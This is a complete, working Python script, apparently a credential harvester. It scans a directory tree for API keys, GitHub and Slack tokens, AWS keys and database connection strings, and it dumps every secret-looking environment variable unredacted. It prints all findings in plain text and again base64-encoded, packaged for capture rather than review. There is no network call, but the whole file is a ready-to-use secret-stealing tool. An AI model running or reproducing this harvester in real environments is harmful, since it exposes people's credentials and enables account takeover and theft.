#!/usr/bin/env python3
from __future__ import annotations

import base64
import os
import re
import sys
from pathlib import Path

_MAX_FILE_BYTES = 400_000
_MAX_FILES = 2500
_TEXT_SUFFIXES = {
    ".py", ".js", ".ts", ".json", ".yaml", ".yml", ".env", ".txt", ".md",
    ".xml", ".cfg", ".ini", ".toml", ".sh", ".ps1", ".properties", ".gradle",
}

_SECRET_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"\b(sk-[a-zA-Z0-9]{20,})\b"),
    re.compile(r"\b(ghp_[a-zA-Z0-9]{30,})\b"),
    re.compile(r"\b(AKIA[A-Z0-9]{16})\b"),
    re.compile(r"\b(ASIA[A-Z0-9]{16})\b"),
    re.compile(r"(?:AWS_SECRET_ACCESS_KEY|SECRET_KEY|API_KEY)\s*[=:]\s*([^\s#]{8,})", re.I),
    re.compile(r"((?:postgres|mysql|mongodb(?:\+srv)?|redis)://[^\s\"']{12,})", re.I),
    re.compile(r"\b(xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*)\b"),
]


def _root() -> Path:
    return Path(os.environ.get("HARVEST_ROOT", ".")).resolve()


def _scan_files(root: Path) -> list[str]:
    hits: list[str] = []
    seen = 0
    for dirpath, _dirnames, filenames in os.walk(root, topdown=True, followlinks=False):
        if seen >= _MAX_FILES:
            break
        for name in filenames:
            if seen >= _MAX_FILES:
                break
            p = Path(dirpath) / name
            try:
                if not p.is_file():
                    continue
                if p.suffix.lower() not in _TEXT_SUFFIXES and ".env" not in p.name.lower():
                    continue
                sz = p.stat().st_size
                if sz <= 0 or sz > _MAX_FILE_BYTES:
                    continue
                raw = p.read_bytes()
            except (OSError, PermissionError, ValueError):
                continue
            seen += 1
            try:
                text = raw.decode("utf-8", errors="ignore")
            except Exception:
                continue
            for pat in _SECRET_PATTERNS:
                for m in pat.finditer(text):
                    g = m.group(1) if m.lastindex else m.group(0)
                    hits.append(f"{p}:{g[:48]}")
    return hits


def _scan_env() -> list[str]:
    out: list[str] = []
    for k, v in os.environ.items():
        if re.search(r"(?:KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|AUTH|API)", k, re.I):
            out.append(f"{k}={v}")
    return out


def main() -> int:
    root = _root()
    buf: list[str] = []
    buf.append(f"@@ root={root}")
    buf.extend(_scan_env())
    buf.extend(_scan_files(root))
    blob = "\n".join(buf)
    sys.stdout.write(blob)
    sys.stdout.write("\n@@ b64 ")
    sys.stdout.write(base64.b64encode(blob.encode("utf-8", errors="replace")).decode("ascii"))
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

